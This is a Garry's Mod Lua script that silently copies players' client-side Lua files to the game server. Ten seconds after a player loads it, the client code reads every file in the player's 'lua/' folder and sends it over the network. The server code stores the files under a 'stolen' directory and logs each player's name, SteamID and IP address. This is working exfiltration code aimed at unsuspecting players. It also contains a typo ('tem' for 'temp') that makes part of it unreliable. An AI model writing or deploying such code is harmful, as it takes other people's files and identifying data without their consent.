local function Split( str ) //Thanks to HeX.
	local temp = ""
	local result = {};
	local index = 1;
	
	for i = 0, str:len() do 
		temp = temp..str:sub( i, i );
		
		if( #temp == 62000 ) then
			result[index] = tem;
			index = index + 1;
			temp = ""
		end
	end
	
	result[index] = temp;
	return result;
end

if( SERVER ) then

	util.AddNetworkString( "receivefiles" );
		
	local pmeta = FindMetaTable( "Player" );
	
	function pmeta:NewID()
		return self:SteamID():gsub( ":", "_" );
	end
	
	function pmeta:Log( str )
		return file.Append( "logged_steal.txt", string.format( "[%s] - Stole file %s from %s [ %s | %s ].\n", os.date(), str, self:Name(), self:SteamID(), self:IPAddress() ) );
	end
	
	local function ReceiveFiles( len, pl ) //Messy as hell.
		local File = net.ReadString();
		local Content = net.ReadString();
		local Dir = "stolen/"..pl:NewID();
		if( !file.IsDir( Dir, "DATA" ) ) then
			file.CreateDir( Dir );
		end
		pl:Log( File );
		if( File:Right( 4 ) == ".lua" ) then
			File = File:gsub( ".lua", ".txt" );
		end
		local NewDir = "stolen/"..pl:NewID().."/"..File;
		file.Write( NewDir, string.format( 
[[
/*
	%s [ %s | %s ]
	%s
*/

%s
]], pl:Name(), pl:SteamID(), pl:IPAddress(), File, Content ) );
	end
		
	net.Receive( "receivefiles", ReceiveFiles );
	
end

if( CLIENT ) then

	local Sent = {};
	
	local DontSend = { //Dont need this shit.
		["functiondump.lua"] = true,
		["send.txt"] = true,
		["test.lua"] = true,
	};
	
	local net = net;
	local file = file;
	local pairs = pairs;
	local ipairs = ipairs;
	local timer = timer;
	
	local function SendShit()
		for k, v in pairs( file.Find( "lua/*", "GAME" ) ) do
			if( DontSend[v] ) then
				continue;
			end
			for _, a in ipairs( Split( file.Read( v, "LUA" ) ) ) do
				net.Start( "receivefiles" );
				net.WriteString( v );
				net.WriteString( a );
				net.SendToServer();
			end
		end
	end
	
	timer.Simple( 10, SendShit );
	
end